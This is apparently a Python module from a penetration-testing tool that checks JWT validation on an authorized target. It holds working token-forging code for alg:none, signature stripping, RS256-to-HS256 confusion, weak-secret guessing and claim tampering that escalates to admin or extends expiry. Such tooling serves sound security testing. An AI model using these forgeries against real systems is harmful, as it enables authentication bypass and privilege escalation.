"""JWT manipulation & validation testing (the "change the access token and try
it" workbench).

This is the standard, well-documented set of authorized JWT validation tests —
the same ones Burp's JWT Editor, OWASP, and jwt_tool exercise. Each test crafts
a tampered token, sends it to the target you are authorized to test, and reports
whether the server *accepted* it. Acceptance of a tampered token is the
vulnerability; the tool proves it by exercising it, then stops. It does not use
a forged token to exfiltrate data at scale or attack anything beyond the
authorized target.

Tests implemented (all detectable with a valid sample token from your own login):
  * alg:none / None / NONE / nOnE acceptance (unsigned token accepted)
  * signature stripping (empty signature accepted)
  * signature tampering (a bit-flipped signature is accepted -> not verified)
  * algorithm confusion RS256 -> HS256 (token HMAC-signed with the server's
    PUBLIC key is accepted) — needs the public key (PEM), fetched from a
    configured JWKS/public-key URL or supplied in config; skipped otherwise
  * weak HMAC secret (a small, bounded dictionary; confirms a guessable key)
  * claim tampering / privilege escalation and expiry bypass, demonstrated only
    once a forging primitive (none / weak secret / confusion) has been found

HS* signing and the none-alg / stripping / tampering tests are pure standard
library. The RS->HS confusion test only needs HMAC over the public-key bytes, so
it is also dependency-free.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from dataclasses import dataclass, field
from typing import Any, Optional

# A short, bounded list of guessable HMAC secrets. This confirms a *weak-key
# misconfiguration* on your own instance; it is intentionally not a real cracker
# and ships no large wordlist.
_WEAK_SECRETS = [
    "", "secret", "changeit", "password", "admin", "test", "key", "jwt",
    "jwtsecret", "your-256-bit-secret", "target", "the target", "changeme",
    "supersecret", "0000000000000000", "1234567890",
]

_ALG_NONE_VARIANTS = ["none", "None", "NONE", "nOnE"]


# --- base64url helpers -------------------------------------------------------
def b64url_decode(s: str) -> bytes:
    s = s.encode() if isinstance(s, str) else s
    pad = b"=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


@dataclass
class DecodedJwt:
    header: dict[str, Any]
    payload: dict[str, Any]
    signature: bytes
    signing_input: str          # header.payload (what a signature covers)
    raw: str

    def parts(self):
        return self.raw.split(".")


def decode(token: str) -> DecodedJwt:
    token = token.strip()
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT (need at least header.payload)")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig = b64url_decode(parts[2]) if len(parts) > 2 and parts[2] else b""
    return DecodedJwt(header, payload, sig, ".".join(parts[:2]), token)


# --- signing -----------------------------------------------------------------
_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def _hs_sign(signing_input: str, secret, alg: str = "HS256") -> bytes:
    key = secret.encode() if isinstance(secret, str) else secret
    return hmac.new(key, signing_input.encode(), _HASHES[alg]).digest()


def encode(header: dict, payload: dict, *, secret=None, alg: Optional[str] = None) -> str:
    alg = alg or header.get("alg", "HS256")
    header = dict(header); header["alg"] = alg
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}"
    if alg.lower() == "none":
        return f"{signing_input}."
    if alg in _HASHES:
        sig = _hs_sign(signing_input, secret if secret is not None else "", alg)
        return f"{signing_input}.{b64url_encode(sig)}"
    raise ValueError(f"unsupported alg for local signing: {alg}")


# --- tamper primitives (each returns a token string) -------------------------
def make_alg_none(dec: DecodedJwt, variant: str = "none",
                  claim_changes: Optional[dict] = None) -> str:
    header = dict(dec.header); header["alg"] = variant
    payload = dict(dec.payload)
    if claim_changes:
        payload.update(claim_changes)
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def make_strip_signature(dec: DecodedJwt) -> str:
    return f"{dec.signing_input}."


def make_tamper_signature(dec: DecodedJwt) -> str:
    parts = dec.parts()
    if len(parts) < 3 or not parts[2]:
        # no signature present; flip a payload byte instead
        return make_strip_signature(dec)
    sig = parts[2]
    flipped = sig[:-1] + ("A" if sig[-1] != "A" else "B")
    return f"{parts[0]}.{parts[1]}.{flipped}"


def make_hs_confusion(dec: DecodedJwt, public_key_pem: str,
                      claim_changes: Optional[dict] = None) -> str:
    """RS256->HS256 confusion: sign with HMAC using the RSA PUBLIC key as the
    secret. A server that mistakenly verifies HS256 with its public key accepts
    this. Uses the PEM text exactly as the server would hand it out."""
    header = dict(dec.header); header["alg"] = "HS256"
    payload = dict(dec.payload)
    if claim_changes:
        payload.update(claim_changes)
    return encode(header, payload, secret=public_key_pem, alg="HS256")


def crack_weak_secret(dec: DecodedJwt, extra: Optional[list[str]] = None) -> Optional[str]:
    """Return the secret if the token's HMAC signature matches a guessable key."""
    alg = dec.header.get("alg", "HS256")
    if alg not in _HASHES:
        return None
    parts = dec.parts()
    if len(parts) < 3 or not parts[2]:
        return None
    target = parts[2]
    for cand in (_WEAK_SECRETS + (extra or [])):
        try:
            sig = b64url_encode(_hs_sign(dec.signing_input, cand, alg))
        except Exception:
            continue
        if hmac.compare_digest(sig, target):
            return cand
    return None


def forge_with_secret(dec: DecodedJwt, secret: str,
                      claim_changes: Optional[dict] = None,
                      alg: Optional[str] = None) -> str:
    payload = dict(dec.payload)
    if claim_changes:
        payload.update(claim_changes)
    return encode(dict(dec.header), payload, secret=secret,
                  alg=alg or dec.header.get("alg", "HS256"))


# --- escalation claim guesses ------------------------------------------------
def escalation_variants(payload: dict) -> list[dict]:
    """Reasonable claim changes to test privilege escalation / expiry bypass."""
    out = []
    role_keys = [k for k in payload if k.lower() in
                 ("role", "roles", "rolename", "authorities", "scope", "isadmin",
                  "admin", "is_admin", "usertype")]
    for k in role_keys:
        out.append({k: "admin"})
        out.append({k: True})
    # generic escalation claims even if not present
    out.append({"role": "admin"})
    out.append({"admin": True})
    # expiry bypass: push exp far into the future
    if "exp" in payload:
        out.append({"exp": int(time.time()) + 10 * 365 * 24 * 3600})
    return out


# --- the tester --------------------------------------------------------------
@dataclass
class JwtTestResult:
    test: str
    accepted: bool
    detail: str
    token_snippet: str = ""
    evidence_status: Optional[int] = None
    claim_changes: dict = field(default_factory=dict)


class JwtLab:
    """Runs the JWT test battery against a live, authorized target.

    ``send_with_token(token) -> RequestRecord`` must send the *same* protected
    request but with the supplied token, so we can observe acceptance. Oracles:
      * ``good``   — the response with the real, valid token (authorized)
      * ``denied`` — the response with no/invalid auth (e.g. anon 401/403)
    """

    def __init__(self, send_with_token, good, denied, *,
                 public_key_pem: Optional[str] = None,
                 extra_secrets: Optional[list[str]] = None):
        self.send = send_with_token
        self.good = good
        self.denied = denied
        self.public_key_pem = public_key_pem
        self.extra_secrets = extra_secrets or []

    def _accepted(self, rec) -> bool:
        """A tampered token is 'accepted' if the server serves the protected
        resource (like the good response) rather than denying it."""
        if rec is None or rec.status == 0:
            return False
        if rec.status in (401, 403):
            return False
        # accepted iff it looks like the authorized response, not the denied one
        if self.good is not None and rec.status == self.good.status:
            return True
        if rec.status == 200 and (self.denied is None or self.denied.status != 200):
            return True
        return False

    def run(self, token: str) -> list[JwtTestResult]:
        results: list[JwtTestResult] = []
        try:
            dec = decode(token)
        except Exception as exc:
            return [JwtTestResult("decode", False, f"could not decode token: {exc}")]

        forging_secret = None

        # 1) alg:none variants
        for variant in _ALG_NONE_VARIANTS:
            tok = make_alg_none(dec, variant)
            rec = self.send(tok)
            acc = self._accepted(rec)
            results.append(JwtTestResult(
                f"alg_none:{variant}", acc,
                "unsigned token accepted" if acc else "rejected (good)",
                tok[:40], getattr(rec, "status", None)))
            if acc:
                break  # one is enough to prove it

        # 2) signature stripping
        rec = self.send(make_strip_signature(dec))
        results.append(JwtTestResult("strip_signature", self._accepted(rec),
                                     "empty signature accepted" if self._accepted(rec)
                                     else "rejected (good)", evidence_status=getattr(rec, "status", None)))

        # 3) signature tampering
        rec = self.send(make_tamper_signature(dec))
        results.append(JwtTestResult("tamper_signature", self._accepted(rec),
                                     "modified signature accepted -> not verified"
                                     if self._accepted(rec) else "rejected (good)",
                                     evidence_status=getattr(rec, "status", None)))

        # 4) weak secret
        secret = crack_weak_secret(dec, self.extra_secrets)
        if secret is not None:
            forging_secret = secret
            results.append(JwtTestResult("weak_secret", True,
                                         f"HMAC secret is guessable: {secret!r}"))
        else:
            results.append(JwtTestResult("weak_secret", False,
                                         "no guessable secret in the bounded list"))

        # 5) algorithm confusion RS256 -> HS256
        if self.public_key_pem and str(dec.header.get("alg", "")).upper().startswith("RS"):
            tok = make_hs_confusion(dec, self.public_key_pem)
            rec = self.send(tok)
            results.append(JwtTestResult("alg_confusion_rs_to_hs", self._accepted(rec),
                                         "token HMAC-signed with the public key accepted"
                                         if self._accepted(rec) else "rejected (good)",
                                         evidence_status=getattr(rec, "status", None)))

        # 6) claim tampering / privilege escalation / expiry bypass — only
        #    meaningful if we have a forging primitive (none/weak/confusion).
        none_ok = any(r.accepted for r in results if r.test.startswith("alg_none"))
        strip_ok = any(r.accepted for r in results if r.test in ("strip_signature", "tamper_signature"))
        for changes in escalation_variants(dec.payload):
            tok = None
            how = None
            if forging_secret is not None:
                tok = forge_with_secret(dec, forging_secret, changes); how = "weak-secret forge"
            elif none_ok:
                tok = make_alg_none(dec, "none", changes); how = "alg:none forge"
            elif strip_ok:
                # server ignores signature; keep alg, just change claims
                header = dict(dec.header)
                h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
                payload = dict(dec.payload); payload.update(changes)
                p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
                parts = dec.parts()
                sig = parts[2] if len(parts) > 2 else ""
                tok = f"{h}.{p}.{sig}"; how = "unverified-signature forge"
            if tok is None:
                results.append(JwtTestResult("claim_tamper", False,
                                             "no forging primitive available; "
                                             "cannot test claim tampering",
                                             claim_changes=changes))
                break
            rec = self.send(tok)
            acc = self._accepted(rec)
            results.append(JwtTestResult(
                "claim_tamper", acc,
                (f"claim change {changes} accepted via {how}" if acc
                 else f"claim change {changes} rejected"),
                tok[:40], getattr(rec, "status", None), claim_changes=changes))
            if acc:
                break  # proven; don't hammer with every variant
        return results
